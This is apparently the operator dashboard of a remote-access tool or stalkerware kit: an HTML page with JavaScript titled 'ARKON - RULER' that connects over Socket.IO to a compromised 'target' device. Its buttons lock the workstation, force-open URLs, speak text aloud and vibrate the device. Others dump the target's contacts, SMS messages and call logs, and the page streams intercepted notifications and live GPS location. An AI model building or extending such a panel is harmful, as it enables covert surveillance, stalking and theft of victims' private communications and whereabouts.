<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ARKON - RULER</title>
    <style>
        :root {
            --neon: #00ff41;
            --danger: #ff0055;
            --bg: #0d0d0d;
        }

        body {
            background-color: var(--bg);
            color: var(--neon);
            font-family: 'Courier New', monospace;
            text-align: center;
            padding: 20px;
            margin: 0;
            user-select: none;
        }

        h1 {
            border-bottom: 2px solid var(--neon);
            padding-bottom: 10px;
            letter-spacing: 5px;
        }

        .status {
            margin-bottom: 30px;
            font-size: 1.2rem;
        }

        .grid {
            display: grid;
            gap: 15px;
            grid-template-columns: 1fr 1fr;
        }

        button {
            background: transparent;
            border: 2px solid var(--neon);
            color: var(--neon);
            padding: 20px;
            font-family: inherit;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.1s;
        }

        button:active {
            background: var(--neon);
            color: var(--bg);
            transform: scale(0.98);
        }

        button.danger {
            border-color: var(--danger);
            color: var(--danger);
        }

        button.danger:active {
            background: var(--danger);
            color: white;
        }

        input {
            width: 100%;
            box-sizing: border-box;
            background: #000;
            border: 1px solid #333;
            color: white;
            padding: 10px;
            margin-top: 10px;
            font-family: inherit;
            display: none;
        }

        #terminal {
            margin-top: 30px;
            opacity: 0.7;
            font-size: 0.8rem;
            text-align: left;
            height: 100px;
            overflow-y: auto;
            border-top: 1px solid #333;
            padding-top: 10px;
        }

        /* Login Overlay */
        #login-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: var(--bg);
            z-index: 1000;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #login-overlay input {
            display: block;
            width: 80%;
            margin-bottom: 20px;
            text-align: center;
            font-size: 1.2rem;
            border: 2px solid var(--neon);
        }

        #login-overlay button {
            width: 80%;
        }

        /* Vitals Card */
        #vitals-card {
            border: 1px solid var(--neon);
            margin: 20px auto;
            max-width: 600px;
            display: flex;
            justify-content: space-around;
            padding: 15px;
            font-size: 0.9rem;
            background: #111;
        }

        .vital-item {
            display: flex;
            flex-direction: column;
        }

        .vital-label {
            color: #666;
            font-size: 0.7rem;
            margin-bottom: 5px;
        }

        /* Modal Styles */
        #modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 2000;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #modal-content {
            border: 2px solid var(--neon);
            background: var(--bg);
            width: 80%;
            max-height: 80%;
            overflow-y: auto;
            padding: 20px;
            text-align: left;
        }
    </style>
</head>

<body>

    <!-- Security Gate -->
    <div id="login-overlay">
        <h1>ACCESS DENIED</h1>
        <p>AUTHENTICATION REQUIRED</p>
        <input type="password" id="password" placeholder="ENTER ACCESS CODE">
        <button onclick="login()">UNLOCK SYSTEM</button>
    </div>

    <h1>ARKON</h1>
    <div class="status" id="status">[WAITING FOR TARGET...]</div>

    <div id="vitals-card">
        <div class="vital-item">
            <span class="vital-label">BATTERY</span>
            <span id="vital-battery">--%</span>
        </div>
        <div class="vital-item">
            <span class="vital-label">STATUS</span>
            <span id="vital-charging">DISCONNECTED</span>
        </div>
        <div class="vital-item">
            <span class="vital-label">NETWORK</span>
            <span id="vital-network">OFFLINE</span>
        </div>
    </div>

    <div class="grid">
        <button onclick="cmd('LOCK')" class="danger">LOCK WORKSTATION</button>
        <button onclick="cmd('MINIMIZE')">MINIMIZE ALL</button>

        <button onclick="toggleInput('speak')">VOICE OF GOD</button>
        <button onclick="toggleInput('open')">FORCE OPEN</button>
        <button onclick="cmd('VIBRATE')">VIBRATE TARGET</button>
        <button onclick="cmd('TORCH_ON')">TORCH ON</button>
        <button onclick="cmd('TORCH_OFF')" class="danger">TORCH OFF</button>
        <button onclick="cmd('GET_APPS')">FETCH APPS</button>
        <button onclick="cmd('GET_CONTACTS')">DUMP CONTACTS</button>
        <button onclick="cmd('GET_SMS')">DUMP SMS</button>
        <button onclick="cmd('GET_CALL_LOGS')">DUMP CALL LOGS</button>
    </div>

    <input type="text" id="speak_input" placeholder="Enter text to speak..." onchange="sendInput('SPEAK', this.value)">
    <input type="text" id="open_input" placeholder="Enter URL..." onchange="sendInput('OPEN', this.value)">

    <div id="location-box" style="margin: 20px 0; border: 1px dashed var(--neon); padding: 10px;">
        <a id="maps-link" href="#" target="_blank" style="color: var(--neon); text-decoration: none;">[NO GPS DATA]</a>
    </div>

    <div id="notifications"
        style="border: 1px solid #333; padding: 10px; height: 150px; overflow-y: scroll; text-align: left; margin-bottom: 20px;">
        <div style="border-bottom: 1px solid #333; color: #666; font-size: 0.8rem;">[NOTIFICATION INTERCEPT STREAM]
        </div>
    </div>

    <div id="modal-overlay">
        <div id="modal-content">
            <h2 id="modal-title" style="border-bottom: 2px solid var(--neon);">DATA VIEW</h2>
            <div id="modal-list" style="margin-top: 10px;">Loading...</div>
            <button onclick="closeModal()" style="margin-top: 20px; width: 100%;">CLOSE</button>
        </div>
    </div>

    <div id="terminal"></div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const term = document.getElementById('terminal');
        const statusEl = document.getElementById('status');
        const overlay = document.getElementById('login-overlay');
        const passInput = document.getElementById('password');

        // Login Logic
        function login() {
            const pass = passInput.value;
            socket.emit('login', pass);
        }

        socket.on('login_success', () => {
            overlay.style.display = 'none';
            log('ACCESS GRANTED');
            // Identify as Mobile Controller AFTER auth
            socket.emit('identify', 'mobile');
        });

        socket.on('login_fail', () => {
            alert('ACCESS DENIED');
            passInput.value = '';
        });

        socket.on('status', (state) => {
            statusEl.innerText = state === 'ONLINE' ? '[TARGET ACQUIRED]' : '[TARGET LOST]';
            statusEl.style.color = state === 'ONLINE' ? '#00ff41' : '#ff0055';
            log(`System status: ${state}`);
        });

        // GPS Update
        socket.on('gps', (data) => {
            log(`ðŸ“¡ GPS UPDATE: ${data.lat}, ${data.lon} (Speed: ${data.speed}m/s)`, 'neon');
            const mapLink = `<a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" style="color:var(--neon)">[VIEW ON MAP]</a>`;
            log(mapLink, 'neon');
        });

        // Notifications
        socket.on('notification', (data) => {
            log(`ðŸ“© [${data.app}] ${data.title}: ${data.text}`, 'neon');
        });

        // Vitals
        socket.on('vitals', (data) => {
            document.getElementById('vital-battery').innerText = data.battery + '%';
            document.getElementById('vital-charging').innerText = data.charging ? 'CHARGING' : 'DISCHARGED';
            document.getElementById('vital-network').innerText = data.network || 'UNKNOWN';
            log(`ðŸ”‹ VITALS SYNCED: Bat ${data.battery}%, Net: ${data.network}`, 'neon');
        });

        // App List
        socket.on('app_list', (data) => {
            renderList('INSTALLED APPLICATIONS', data.apps.map(app => `> ${app}`));
            log(`ðŸ“„ APP LIST RECEIVED (${data.apps.length} items)`, 'neon');
        });

        // Contacts
        socket.on('contacts', (data) => {
            renderList('CONTACT DUMP', data.contacts.map(c => `ðŸ‘¤ ${c.name} : ${c.number}`));
            log(`ðŸ“‡ CONTACTS DUMPED (${data.contacts.length} items)`, 'neon');
        });

        // SMS
        socket.on('sms', (data) => {
            renderList('SMS INBOX', data.sms.map(s => `âœ‰ï¸ [${s.address}] ${s.body}`));
            log(`ðŸ’¬ SMS DUMPED (${data.sms.length} items)`, 'neon');
        });

        // Call Logs
        socket.on('call_logs', (data) => {
            renderList('CALL LOGS', data.call_logs.map(l => `ðŸ“ž [${l.number}] | Duration: ${l.duration}s`));
            log(`â˜Žï¸ CALL LOGS DUMPED (${data.call_logs.length} items)`, 'neon');
        });

        function renderList(title, items) {
            document.getElementById('modal-title').innerText = title;
            const listDiv = document.getElementById('modal-list');
            listDiv.innerHTML = '';

            if (items && items.length > 0) {
                items.forEach(text => {
                    const item = document.createElement('div');
                    item.style.marginBottom = '5px';
                    item.style.borderBottom = '1px solid #333';
                    item.innerText = text;
                    listDiv.appendChild(item);
                });
            } else {
                listDiv.innerText = 'No records found or data empty.';
            }

            document.getElementById('modal-overlay').style.display = 'flex';
        }

        function closeModal() {
            document.getElementById('modal-overlay').style.display = 'none';
        }

        function cmd(action) {
            if (navigator.vibrate) navigator.vibrate(50);
            socket.emit('command', { action });
            log(`Sent command: ${action}`);
        }

        function sendInput(action, value) {
            socket.emit('command', { action, value });
            log(`Sent payload: ${action} -> ${value}`);
            document.getElementById('speak_input').style.display = 'none';
            document.getElementById('open_input').style.display = 'none';
        }

        function toggleInput(type) {
            const el = document.getElementById(`${type}_input`);
            el.style.display = el.style.display === 'block' ? 'none' : 'block';
            el.focus();
        }

        function log(msg) {
            term.innerHTML += `> ${msg}<br>`;
            term.scrollTop = term.scrollHeight;
        }
    </script>
</body>

</html>
